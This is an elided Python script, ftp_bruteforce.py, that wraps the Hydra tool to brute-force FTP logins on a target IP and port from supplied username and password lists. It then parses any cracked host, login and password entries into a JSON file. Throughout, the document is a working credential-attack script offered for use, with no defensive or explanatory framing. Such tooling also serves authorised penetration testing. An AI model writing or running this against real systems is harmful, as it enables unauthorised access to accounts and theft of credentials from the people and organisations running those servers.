...
def run_hydra(target_ip, port, user_list, pass_list):
    command = [
        'hydra', '-L', user_list, '-P', pass_list, '-s', port, '-o', 'ftp_hydra_results.txt', '-f', '-V', target_ip, 'ftp'
    ]

    try:
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        with open('ftp_hydra_results.txt', 'r') as file:
            raw_results = file.read()
        
        parsed_results = parse_hydra_output(raw_results)
        with open('ftp_hydra_results.json', 'w') as json_file:
...
def parse_hydra_output(raw_output):
    ...
    for line in raw_output.splitlines():
        match = re.search(r'\[ftp\] host: (\S+)   login: (\S+)   password: (\S+)', line)
        if match:
            results.append({
                'host': match.group(1),
                'login': match.group(2),
...
if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage: python3 ftp_bruteforce.py <target_ip> <port> <user_list> <pass_list>", file=sys.stderr)
        sys.exit(1)
